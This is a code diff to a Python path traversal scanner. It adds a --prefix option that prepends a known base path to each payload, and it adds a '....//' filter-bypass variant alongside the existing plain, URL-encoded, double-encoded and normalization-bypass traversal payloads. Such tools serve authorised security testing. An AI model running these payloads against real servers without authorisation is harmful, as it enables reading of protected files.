@@ -64,6 +64,7 @@ class PathTraversalScanner:
         self.files_to_test = self._parse_files(args.files)
         self.method = args.method.lower()
         self.injection_location = args.injection_location.lower()
+        self.prefix = (args.prefix or "").strip()
         self.found_vulnerabilities = set()
         self.baseline_response: Optional[BaselineResponse] = None
         self.headers = {
@@ -206,17 +207,38 @@ class PathTraversalScanner:
         if file_path != clean_path:
             paths_to_test.append(clean_path)
 
+        prefix = self.prefix
+        if prefix and not prefix.endswith("/"):
+            prefix += "/"
+
         for path in paths_to_test:
             # Some targets accept direct absolute/relative file paths without traversal.
             payloads.append((path, 0, "direct"))
+            if prefix:
+                payloads.append((f"{prefix}{path.lstrip('/')}", 0, "prefixed-direct"))
 
             for depth in range(1, self.max_depth + 1):
-                payloads.append(("../" * depth + path, depth, "standard"))
-                payloads.append(("%2e%2e%2f" * depth + path, depth, "url-encoded"))
-                payloads.append(("%252e%252e%252f" * depth + path, depth, "double-url-encoded"))
-                payloads.append(("..%2f" * depth + path, depth, "mixed-encoded"))
+                standard = "../" * depth + path
+                url_encoded = "%2e%2e%2f" * depth + path
+                double_encoded = "%252e%252e%252f" * depth + path
+                mixed_encoded = "..%2f" * depth + path
+                dotdot_slash_bypass = "....//" * depth + path.lstrip("/")
+                payloads.append((standard, depth, "standard"))
+                payloads.append((url_encoded, depth, "url-encoded"))
+                payloads.append((double_encoded, depth, "double-url-encoded"))
+                payloads.append((mixed_encoded, depth, "mixed-encoded"))
+                payloads.append((dotdot_slash_bypass, depth, "dotdot-slash-bypass"))
+                if prefix:
+                    payloads.append((f"{prefix}{standard}", depth, "prefixed-standard"))
+                    payloads.append((f"{prefix}{url_encoded}", depth, "prefixed-url-encoded"))
+                    payloads.append((f"{prefix}{double_encoded}", depth, "prefixed-double-url-encoded"))
+                    payloads.append((f"{prefix}{mixed_encoded}", depth, "prefixed-mixed-encoded"))
+                    payloads.append((f"{prefix}{dotdot_slash_bypass}", depth, "prefixed-dotdot-slash-bypass"))
                 if depth > 1:
-                    payloads.append(("../" * (depth - 1) + "a/../" + path, depth, "normalization-bypass"))
+                    norm = "../" * (depth - 1) + "a/../" + path
+                    payloads.append((norm, depth, "normalization-bypass"))
+                    if prefix:
+                        payloads.append((f"{prefix}{norm}", depth, "prefixed-normalization-bypass"))
 
         seen = set()
         unique_payloads = []
@@ -553,6 +575,10 @@ def parse_args() -> argparse.Namespace:
         choices=["query", "path"],
         default="query",
         help="Inject payload into query parameter or path segment",
+    )
+    parser.add_argument(
+        "--prefix",
+        help="Known base path/prefix to prepend to payloads, e.g. /var/www/images/",
     )
     return parser.parse_args()
 
